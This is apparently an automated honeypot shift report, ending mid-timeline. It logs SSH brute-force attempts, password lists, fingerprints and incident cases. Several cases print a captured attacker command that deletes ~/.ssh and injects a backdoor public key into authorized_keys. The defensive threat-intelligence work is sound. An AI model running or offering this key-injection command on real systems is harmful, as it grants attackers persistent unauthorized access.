# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-04 |
| **Generated At** | 2026-05-04T17:45:05Z |
| **Shift Time** | 17:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **691** |
| Confirmed Threats | **614** |
| False Positives Filtered | **77** (11.1%) |
| Unique Attacker IPs | **43** |
| Countries of Origin | **26** |
| High Severity Cases | **104** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **587** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **230** |
| Unique Credential Pairs | **125** |
| Unique Usernames | **45** |
| Unique Passwords | **121** |
| Successful Auth Pairs | **57** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 104 |
| `345gs5662d34` | 52 |
| `ubuntu` | 16 |
| `admin` | 6 |
| `postgres` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 52 |
| `3245gs5662d34` | 52 |
| `admin` | 4 |
| `Gx123456` | 3 |
| `1234` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 52 |
| `root` | `3245gs5662d34` | 52 |
| `root` | `Gx123456` | 3 |
| `jason` | `admin` | 2 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Gx123456` | `222.110.147.56` | 2026-05-04T14:53:54 |
| `root` | `3245gs5662d34` | `222.110.147.56` | 2026-05-04T14:53:59 |
| `root` | `Gx123456` | `27.110.166.67` | 2026-05-04T14:57:20 |
| `root` | `3245gs5662d34` | `27.110.166.67` | 2026-05-04T14:57:24 |
| `root` | `killer` | `222.110.147.56` | 2026-05-04T14:58:38 |
| `root` | `welcome@2026` | `222.110.147.56` | 2026-05-04T15:03:21 |
| `root` | `Qweasd123456` | `222.110.147.56` | 2026-05-04T15:08:06 |
| `root` | `7788` | `222.110.147.56` | 2026-05-04T15:12:51 |
| `root` | `1qaz1QAZ` | `222.110.147.56` | 2026-05-04T15:17:34 |
| `root` | `P@ss` | `222.110.147.56` | 2026-05-04T15:22:17 |
| `root` | `usman123` | `222.110.147.56` | 2026-05-04T15:27:00 |
| `root` | `1qasde32w` | `222.110.147.56` | 2026-05-04T15:31:45 |
| `root` | `test12345678` | `102.88.137.80` | 2026-05-04T15:40:08 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-05-04T15:40:15 |
| `root` | `Aa123456@` | `222.110.147.56` | 2026-05-04T15:50:44 |
| `root` | `admin123456!` | `222.110.147.56` | 2026-05-04T16:00:13 |
| `root` | `testing1` | `103.168.135.187` | 2026-05-04T16:04:06 |
| `root` | `3245gs5662d34` | `103.168.135.187` | 2026-05-04T16:04:08 |
| `root` | `cmsadmin` | `103.168.135.187` | 2026-05-04T16:04:54 |
| `root` | `qazse` | `222.110.147.56` | 2026-05-04T16:04:58 |
| `root` | `zxc741` | `222.110.147.56` | 2026-05-04T16:09:41 |
| `root` | `123QWEasd!@#` | `102.213.34.99` | 2026-05-04T16:11:39 |
| `root` | `3245gs5662d34` | `102.213.34.99` | 2026-05-04T16:11:48 |
| `root` | `P@$$w0rd@123` | `102.213.34.99` | 2026-05-04T16:12:46 |
| `root` | `1qaz@wsx2026` | `102.213.34.99` | 2026-05-04T16:13:54 |
| `root` | `4rfv$RFV4rfv` | `222.110.147.56` | 2026-05-04T16:14:25 |
| `root` | `Gx123456` | `102.213.34.99` | 2026-05-04T16:16:06 |
| `root` | `teste!@#` | `103.168.135.187` | 2026-05-04T16:16:29 |
| `root` | `jancok123` | `102.213.34.99` | 2026-05-04T16:18:13 |
| `root` | `1qaz` | `102.213.34.99` | 2026-05-04T16:19:20 |
| `root` | `Tan@123` | `102.213.34.99` | 2026-05-04T16:20:24 |
| `root` | `Q!W@E#r4t5y6` | `102.213.34.99` | 2026-05-04T16:21:27 |
| `root` | `12332112` | `102.213.34.99` | 2026-05-04T16:22:31 |
| `root` | `123456qW` | `102.213.34.99` | 2026-05-04T16:23:33 |
| `root` | `1qaz2wsX` | `102.213.34.99` | 2026-05-04T16:24:39 |
| `root` | `Cloud_123` | `102.213.34.99` | 2026-05-04T16:25:51 |
| `root` | `Gx123456@` | `102.213.34.99` | 2026-05-04T16:26:59 |
| `root` | `snake123` | `102.213.34.99` | 2026-05-04T16:28:05 |
| `root` | `Admin@11` | `222.110.147.56` | 2026-05-04T16:28:34 |
| `root` | `pass2026` | `102.213.34.99` | 2026-05-04T16:29:09 |
| `root` | `Lhx123456` | `102.213.34.99` | 2026-05-04T16:30:14 |
| `root` | `123@.com` | `102.213.34.99` | 2026-05-04T16:31:23 |
| `root` | `123!@#aA` | `102.213.34.99` | 2026-05-04T16:32:28 |
| `root` | `qwerty24` | `222.110.147.56` | 2026-05-04T16:33:16 |
| `root` | `thankyou` | `102.213.34.99` | 2026-05-04T16:34:35 |
| `root` | `wkdskfk` | `102.213.34.99` | 2026-05-04T16:35:37 |
| `root` | `123456@w` | `102.213.34.99` | 2026-05-04T16:36:40 |
| `root` | `ruijie@2026` | `102.213.34.99` | 2026-05-04T16:37:44 |
| `root` | `t00r` | `222.110.147.56` | 2026-05-04T16:37:59 |
| `root` | `intelinside` | `102.213.34.99` | 2026-05-04T16:38:53 |
| `root` | `password_2` | `102.213.34.99` | 2026-05-04T16:39:57 |
| `root` | `qwerty1234` | `102.213.34.99` | 2026-05-04T16:41:04 |
| `root` | `piramida` | `102.213.34.99` | 2026-05-04T16:42:08 |
| `root` | `admin123.` | `222.110.147.56` | 2026-05-04T16:47:27 |
| `root` | `6yhn7ujm` | `222.110.147.56` | 2026-05-04T16:52:10 |
| `root` | `XSW@2wsx` | `222.110.147.56` | 2026-05-04T16:56:53 |
| `root` | `@WSX3edc$RFV` | `222.110.147.56` | 2026-05-04T17:01:37 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **691** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 231 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 157 | 3 |
| `03a80b21afa8...` | Modern SSH client | 38 | 3 |
| `713bd9cc9355...` | Mirai/variant | 32 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 2 | 2 |
| `19532158b559...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 157 | 3 | libssh-based |
| `03a80b21afa8...` | libssh | 38 | 3 | Modern SSH client |
| `713bd9cc9355...` | libssh | 32 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `19532158b559...` | libssh | 2 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 52 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `27.110.166.67`, `102.213.34.99`, `102.88.137.80`, `222.110.147.56`, `103.168.135.187`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **43** |
| Unique ASNs | **38** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS23201` | Telecel S.A. | 2 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | MEDIUM |
| `AS271812` | CONEXT VENEZUELA, C.A. | 1 | LOW |
| `AS7545` | TPG Telecom Limited | 1 | MEDIUM |
| `AS38121` | LG HelloVision Corp. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (104)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ee3210c767b4

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 14:53 |
| **Last Seen** | 2026-05-04 14:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 14:53:54` | `cowrie.session.connect` |
| `2026-05-04 14:53:54` | `cowrie.client.version` |
| `2026-05-04 14:53:54` | `cowrie.client.kex` |
| `2026-05-04 14:53:54` | `cowrie.login.success` |
| `2026-05-04 14:53:55` | `cowrie.session.params` |
| `2026-05-04 14:53:55` | `cowrie.command.input` |
| `2026-05-04 14:53:55` | `cowrie.command.failed` |
| `2026-05-04 14:53:55` | `cowrie.log.closed` |
| `2026-05-04 14:53:55` | `cowrie.session.params` |
| `2026-05-04 14:53:55` | `cowrie.command.input` |
| `2026-05-04 14:53:56` | `cowrie.session.file_download` |
| `2026-05-04 14:53:56` | `cowrie.log.closed` |
| `2026-05-04 14:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8f6b46fbc9c

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 14:53 |
| **Last Seen** | 2026-05-04 14:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 14:53:58` | `cowrie.session.connect` |
| `2026-05-04 14:53:58` | `cowrie.client.version` |
| `2026-05-04 14:53:58` | `cowrie.client.kex` |
| `2026-05-04 14:53:59` | `cowrie.login.success` |
| `2026-05-04 14:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4d3a09baf0f

| Field | Detail |
|---|---|
| **Source IP** | `27.110.166[.]67` |
| **First Seen** | 2026-05-04 14:57 |
| **Last Seen** | 2026-05-04 14:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 14:57:19` | `cowrie.session.connect` |
| `2026-05-04 14:57:19` | `cowrie.client.version` |
| `2026-05-04 14:57:20` | `cowrie.client.kex` |
| `2026-05-04 14:57:20` | `cowrie.login.success` |
| `2026-05-04 14:57:21` | `cowrie.session.params` |
| `2026-05-04 14:57:21` | `cowrie.command.input` |
| `2026-05-04 14:57:21` | `cowrie.command.failed` |
| `2026-05-04 14:57:21` | `cowrie.log.closed` |
| `2026-05-04 14:57:21` | `cowrie.session.params` |
| `2026-05-04 14:57:21` | `cowrie.command.input` |
| `2026-05-04 14:57:21` | `cowrie.session.file_download` |
| `2026-05-04 14:57:21` | `cowrie.log.closed` |
| `2026-05-04 14:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.110.166[.]67` to AbuseIPDB if not already reported
- [ ] Block `27.110.166[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55d51130e2f4

| Field | Detail |
|---|---|
| **Source IP** | `27.110.166[.]67` |
| **First Seen** | 2026-05-04 14:57 |
| **Last Seen** | 2026-05-04 14:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 14:57:23` | `cowrie.session.connect` |
| `2026-05-04 14:57:23` | `cowrie.client.version` |
| `2026-05-04 14:57:23` | `cowrie.client.kex` |
| `2026-05-04 14:57:24` | `cowrie.login.success` |
| `2026-05-04 14:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.110.166[.]67` to AbuseIPDB if not already reported
- [ ] Block `27.110.166[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ad5711169e7

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 14:58 |
| **Last Seen** | 2026-05-04 14:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 14:58:38` | `cowrie.session.connect` |
| `2026-05-04 14:58:38` | `cowrie.client.version` |
| `2026-05-04 14:58:38` | `cowrie.client.kex` |
| `2026-05-04 14:58:38` | `cowrie.login.success` |
| `2026-05-04 14:58:39` | `cowrie.session.params` |
| `2026-05-04 14:58:39` | `cowrie.command.input` |
| `2026-05-04 14:58:39` | `cowrie.command.failed` |
| `2026-05-04 14:58:39` | `cowrie.log.closed` |
| `2026-05-04 14:58:39` | `cowrie.session.params` |
| `2026-05-04 14:58:39` | `cowrie.command.input` |
| `2026-05-04 14:58:39` | `cowrie.session.file_download` |
| `2026-05-04 14:58:39` | `cowrie.log.closed` |
| `2026-05-04 14:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f730207f3b27

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 14:58 |
| **Last Seen** | 2026-05-04 14:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 14:58:41` | `cowrie.session.connect` |
| `2026-05-04 14:58:41` | `cowrie.client.version` |
| `2026-05-04 14:58:41` | `cowrie.client.kex` |
| `2026-05-04 14:58:42` | `cowrie.login.success` |
| `2026-05-04 14:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17e4dbc1b3de

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:03 |
| **Last Seen** | 2026-05-04 15:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:03:21` | `cowrie.session.connect` |
| `2026-05-04 15:03:21` | `cowrie.client.version` |
| `2026-05-04 15:03:21` | `cowrie.client.kex` |
| `2026-05-04 15:03:21` | `cowrie.login.success` |
| `2026-05-04 15:03:22` | `cowrie.session.params` |
| `2026-05-04 15:03:22` | `cowrie.command.input` |
| `2026-05-04 15:03:22` | `cowrie.command.failed` |
| `2026-05-04 15:03:22` | `cowrie.log.closed` |
| `2026-05-04 15:03:22` | `cowrie.session.params` |
| `2026-05-04 15:03:22` | `cowrie.command.input` |
| `2026-05-04 15:03:22` | `cowrie.session.file_download` |
| `2026-05-04 15:03:22` | `cowrie.log.closed` |
| `2026-05-04 15:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa5c5e2d0e1c

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:03 |
| **Last Seen** | 2026-05-04 15:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:03:24` | `cowrie.session.connect` |
| `2026-05-04 15:03:24` | `cowrie.client.version` |
| `2026-05-04 15:03:24` | `cowrie.client.kex` |
| `2026-05-04 15:03:25` | `cowrie.login.success` |
| `2026-05-04 15:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd7a6ee37e81

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:08 |
| **Last Seen** | 2026-05-04 15:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:08:06` | `cowrie.session.connect` |
| `2026-05-04 15:08:06` | `cowrie.client.version` |
| `2026-05-04 15:08:06` | `cowrie.client.kex` |
| `2026-05-04 15:08:06` | `cowrie.login.success` |
| `2026-05-04 15:08:07` | `cowrie.session.params` |
| `2026-05-04 15:08:07` | `cowrie.command.input` |
| `2026-05-04 15:08:07` | `cowrie.command.failed` |
| `2026-05-04 15:08:07` | `cowrie.log.closed` |
| `2026-05-04 15:08:07` | `cowrie.session.params` |
| `2026-05-04 15:08:07` | `cowrie.command.input` |
| `2026-05-04 15:08:07` | `cowrie.session.file_download` |
| `2026-05-04 15:08:07` | `cowrie.log.closed` |
| `2026-05-04 15:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d38044e32d9

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:08 |
| **Last Seen** | 2026-05-04 15:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:08:09` | `cowrie.session.connect` |
| `2026-05-04 15:08:09` | `cowrie.client.version` |
| `2026-05-04 15:08:09` | `cowrie.client.kex` |
| `2026-05-04 15:08:10` | `cowrie.login.success` |
| `2026-05-04 15:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3341adac876

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:12 |
| **Last Seen** | 2026-05-04 15:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:12:50` | `cowrie.session.connect` |
| `2026-05-04 15:12:50` | `cowrie.client.version` |
| `2026-05-04 15:12:50` | `cowrie.client.kex` |
| `2026-05-04 15:12:51` | `cowrie.login.success` |
| `2026-05-04 15:12:51` | `cowrie.session.params` |
| `2026-05-04 15:12:51` | `cowrie.command.input` |
| `2026-05-04 15:12:51` | `cowrie.command.failed` |
| `2026-05-04 15:12:51` | `cowrie.log.closed` |
| `2026-05-04 15:12:51` | `cowrie.session.params` |
